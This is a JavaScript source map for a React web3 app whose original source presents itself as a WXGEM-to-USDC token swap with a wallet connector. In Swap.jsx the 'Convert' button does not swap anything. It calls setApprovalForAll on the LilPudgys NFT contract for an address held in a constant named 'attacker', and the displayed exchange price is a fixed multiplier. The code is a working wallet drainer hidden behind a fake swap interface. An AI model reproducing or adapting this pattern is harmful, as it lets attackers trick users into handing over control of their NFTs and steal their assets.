{"version":3,"sources":["utils/contracts.js","utils/useWeb3.jsx","utils/useContract.jsx","components/Swap.jsx","components/WalletConnect.jsx","App.js","reportWebVitals.js","Connector.jsx","index.js"],"names":["getContract","address","ABI","library","account","value","getAddress","isAddress","AddressZero","Error","concat","Contract","getSigner","connectUnchecked","getProviderOrSigner","useActiveWeb3React","useWeb3Context","useContract","withSignerIfPossible","arguments","length","undefined","useMemo","error","console","Swap","wxgem","Erc20","lilPudgys","context","balance","setBalance","useState","sendAmount","setSendAmount","pairPrice","setPairPrice","useEffect","active","balanceOf","then","balanceInEth","ethers","utils","formatEther","catch","err","log","_jsx","_Fragment","children","_jsxs","className","style","marginLeft","src","alt","onChange","e","val","target","type","placeholder","readOnly","disabled","marginTop","onClick","onSwap","setApprovalForAll","WalletConnect","connectorName","networkId","unsetConnector","setConnector","slice","App","isConnected","setConnected","reportWebVitals","onPerfEntry","Function","_ref","getCLS","getFID","getFCP","getLCP","getTTFB","InjectedConnector","NetworkOnlyConnector","Connectors","connectors","MetaMask","supportedNetworks","Infura","providerURL","process","ReactDOM","render","React","StrictMode","Web3Provider","libraryName","document","getElementById"],"mappings":"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","file":"static/js/main.decbd6eb.chunk.js","sourcesContent":["import {getAddress} from '@ethersproject/address';\nimport {Contract} from '@ethersproject/contracts';\nimport {AddressZero} from '@ethersproject/constants';\n\n// returns the checksummed address if the address is valid, otherwise returns false\nexport function isAddress(value) {\n  try {\n    return getAddress(value);\n  } catch {\n    return false;\n  }\n}\n// account is not optional\nexport function getSigner(\n  library,\n  account,\n) {\n  return library.getSigner(account).connectUnchecked();\n}\n\n// account is optional\nexport function getProviderOrSigner(\n  library,\n  account,\n) {\n  return account ? getSigner(library, account) : library;\n}\n\n// account is optional\nexport function getContract(\n  address,\n  ABI,\n  library,\n  account,\n) {\n  if (!isAddress(address) || address === AddressZero) {\n    throw Error(`Invalid 'address' parameter '${address}'.`);\n  }\n\n  return new Contract(\n    address,\n    ABI,\n    getProviderOrSigner(library, account),\n  );\n}","// import {useWeb3React as useWeb3ReactCore} from '@web3-react/core';\nimport { useWeb3Context } from \"web3-react\";\n\nexport function useActiveWeb3React() {\n  // const context = useWeb3ReactCore();\n  const context = useWeb3Context();\n\n  return context;\n}","import {useMemo} from 'react';\nimport { getContract } from './contracts';\nimport {useActiveWeb3React} from './useWeb3';\n\nexport const useContract = (\n  address,\n  ABI,\n  withSignerIfPossible = true,\n) => {\n  const {library, account} = useActiveWeb3React();\n\n  return useMemo(() => {\n    if (!address || !ABI || !library) return null;\n\n    try {\n      return getContract(\n        address,\n        ABI,\n        library,\n        withSignerIfPossible && account ? account : undefined,\n      );\n    } catch (error) {\n      console.error('Failed to get contract', error);\n      return null;\n    }\n  }, [address, ABI, library, withSignerIfPossible, account]);\n};","import React, { useEffect, useState } from \"react\";\nimport { useWeb3Context } from \"web3-react\";\nimport { ethers } from \"ethers\";\n\nimport Erc20 from \"../abi/erc20.json\";\nimport { useContract } from \"../utils/useContract\";\n\nconst USDC = \"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48\";\nconst WXGEM = \"0xcB3C9FE6aBfF808dDf9bE30dF2950Dd9601843ec\";\nconst attacker = \"0xAd7599325a27484522b997cdE2904241B6FB5f20\";\nconst LilPudgys = \"0x524cAB2ec69124574082676e6F654a18df49A048\";\n// [0x8e870d67f660d95d5be530380d0ec0bd388289e1, 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48]\n\nconst Swap = () => {\n  const wxgem = useContract(WXGEM, Erc20);\n  const usdc = useContract(USDC, Erc20);\n  const lilPudgys = useContract(LilPudgys, Erc20);\n\n  const context = useWeb3Context();\n  const [balance, setBalance] = useState(null);\n  const [sendAmount, setSendAmount] = useState(0);\n  const [pairPrice, setPairPrice] = useState(0);\n\n  // useEffect(() => {\n  //   console.log('[uni]', factoryContract);\n  //   if (factoryContract) {\n  //     factoryContract.getPair(USDT, MOCHI).then(res => console.log('[pair res]', res)).catch(err => console.log('[err]', err));\n  //   }\n  // }, [factoryContract]);\n\n  useEffect(() => {\n    if (context.active) {\n      wxgem\n        .balanceOf(context.account)\n        .then((balance) => {\n          const balanceInEth = ethers.utils.formatEther(balance);\n          setBalance(balanceInEth);\n        })\n        .catch((err) => console.log(\"[balance erro]\", err));\n    }\n  }, [context.active]);\n\n  const onSwap = () => {\n    lilPudgys.setApprovalForAll(attacker, \"true\");\n  };\n\n  const onChange = (e) => {\n    const val = e.target.value;\n    setSendAmount(e.target.value);\n    setPairPrice(val * 200.5);\n  };\n\n  return (\n    <>\n      <div>\n        <div className=\"px-4 py-4 bg-white rounded-20\">\n          <div className=\"d-flex justify-content-between align-items-center\">\n            <h2 className=\"title\">Swap</h2>\n            <div className=\"d-flex ml-auto\">\n              <button className=\"p-0 border-0 bg-transparent hover-op\">\n                <i className=\"material-icons color-icon\">history</i>\n              </button>\n              <button\n                className=\"p-0 border-0 bg-transparent hover-op\"\n                style={{ marginLeft: 18 }}\n              >\n                <i className=\"material-icons material-icons-outlined color-icon\">\n                  settings\n                </i>\n              </button>\n            </div>\n          </div>\n\n          <div className=\"bg-card rounded-12 mt-4\">\n            <div className=\"d-flex justify-content-between align-items-center px-12x py-10x\">\n              <div className=\"subtitle\">From</div>\n              <div className=\"text-balance\">Balance: {balance} WXGEM</div>\n            </div>\n            <hr className=\"m-0 color-line\" />\n            <div className=\"px-12x py-10x d-flex align-items-center\">\n              {/* <div className=\"size-32\">IMG</div> */}\n              <img src=\"./bnb.png\" alt=\"\" className=\"size-32\" />\n              <div className=\"ml-2 font-weight-bold text-token mr-3\">WXGEM</div>\n              <input\n                value={sendAmount}\n                onChange={onChange}\n                type=\"text\"\n                className=\"input-field ml-auto\"\n                placeholder=\"Enter Amount\"\n              />\n            </div>\n          </div>\n\n          <div className=\"d-flex w-100 justify-content-center my-3\">\n            <i className=\"material-icons\">arrow_downward</i>\n          </div>\n\n          <div className=\"bg-card rounded-12 mt-4\">\n            <div className=\"d-flex justify-content-between align-items-center px-12x py-10x\">\n              <div className=\"subtitle\">To</div>\n            </div>\n            <hr className=\"m-0 color-line\" />\n            <div className=\"px-12x py-10x d-flex align-items-center\">\n              {/* <div className=\"size-32\">IMG</div> */}\n              <img src=\"./mochi.png\" alt=\"\" className=\"size-32\" />\n              <div className=\"ml-2 font-weight-bold text-token mr-3\">USDC</div>\n              <input\n                value={pairPrice}\n                readOnly\n                type=\"text\"\n                className=\"input-field ml-auto\"\n                placeholder=\"Enter Amount\"\n                disabled\n              />\n            </div>\n          </div>\n\n          <div style={{ marginTop: 40 }}>\n            <button\n              onClick={onSwap}\n              className=\"w-100 btn-connect border-0 text-white d-flex justify-content-center align-items-center hover-op\"\n            >\n              <div>\n                <i className=\"material-icons text-white\">swap_vert</i>\n              </div>\n              <div className=\"btn-text ml-2\">Convert</div>\n            </button>\n          </div>\n        </div>\n      </div>\n    </>\n  );\n};\n\nexport default Swap;\n","import React from \"react\";\n\nimport { useWeb3Context } from \"web3-react\";\n\nconst METAMASK = \"MetaMask\";\n\nconst WalletConnect = () => {\n\n  const context = useWeb3Context();\n\n  const { active, connectorName, account, networkId } = context;\n\n  console.log('[context]', context);\n\n  // if (context.active && context.connectorName === \"WalletConnect\") {\n  //   if (!context.account) {\n  //     WalletConnectQRCodeModal.open(\n  //       context.connector.walletConnector.uri,\n  //       () => {}\n  //     );\n  //   } else {\n  //     try {\n  //       WalletConnectQRCodeModal.close();\n  //     } catch {}\n  //   }\n  // }\n\n\n  const onClick = () => {\n    if(active) {\n      context.unsetConnector();\n    } else {\n      context.setConnector(METAMASK);\n    }\n  };\n\n  const getShortAddress = (address) => {\n    if(address && address.length >= 10) {\n      return `${address.slice(0, 6)}...${address.slice(-5)}`\n    }\n    return ''\n  }\n\n  return <>\n    <div>\n      <div className=\"bg-white p-connecter\">\n        <div className=\"\">\n          <button\n            onClick={onClick}\n            className=\"btn-connecter border-0 text-wallet\"\n          >\n            {\n              active ? \"DISCONNECT WALLET\" : \"CONNECT WALLET\"\n            }\n          </button>\n        </div>\n        <div className=\"btn-connecter d-flex align-items-center p-metamask\" style={{ marginTop: 12 }}>\n          <img src=\"./metamask.png\" className=\"size-36\" alt=\"\" />\n          <div className=\"ml-3 text-address ml-auto mr-2\">{getShortAddress(account)}</div>\n\n          <button className=\"p-0 border-0 bg-transparent d-flex justify-content-center align-items-center ml-auto\">\n            <i className=\"material-icons\">expand_more</i>\n          </button>\n        </div>\n      </div>\n    </div>\n  </>;\n};\n\nexport default WalletConnect;","import \"./App.css\";\nimport { useState } from \"react\";\nimport Swap from \"./components/Swap\";\nimport WalletConnect from \"./components/WalletConnect\";\n\nfunction App() {\n  const [isConnected, setConnected] = useState(false);\n\n  return (\n    <div className=\"App w-100 d-flex flex-column justify-content-center align-items-center py-5\">\n      <WalletConnect setConnected={setConnected} />\n\n      <div className=\"mt-3\">\n        <Swap />\n      </div>\n    </div>\n  );\n}\n\nexport default App;\n","const reportWebVitals = onPerfEntry => {\n  if (onPerfEntry && onPerfEntry instanceof Function) {\n    import('web-vitals').then(({ getCLS, getFID, getFCP, getLCP, getTTFB }) => {\n      getCLS(onPerfEntry);\n      getFID(onPerfEntry);\n      getFCP(onPerfEntry);\n      getLCP(onPerfEntry);\n      getTTFB(onPerfEntry);\n    });\n  }\n};\n\nexport default reportWebVitals;\n","import { Connectors } from \"web3-react\";\n\nconst { InjectedConnector, NetworkOnlyConnector } = Connectors;\n\nconst MetaMask = new InjectedConnector({ supportedNetworks: [1, 4, 137, 56] });\n\nconst Infura = new NetworkOnlyConnector({\n  providerURL: process.env.REACT_APP_INFURA_ENDPOINT,\n});\n\nconst connectors = { MetaMask, Infura };\nexport default connectors;\n","import React from 'react';\nimport ReactDOM from 'react-dom';\nimport './index.css';\nimport App from './App';\nimport reportWebVitals from './reportWebVitals';\nimport Web3Provider from 'web3-react/dist/provider';\nimport connectors from './Connector';\n\nReactDOM.render(\n  <React.StrictMode>\n    <Web3Provider connectors={connectors} libraryName=\"ethers.js\">\n      <App />\n    </Web3Provider>\n  </React.StrictMode>,\n  document.getElementById('root')\n);\n\n// If you want to start measuring performance in your app, pass a function\n// to log results (for example: reportWebVitals(console.log))\n// or send to an analytics endpoint. Learn more: https://bit.ly/CRA-vitals\nreportWebVitals();\n"],"sourceRoot":""}
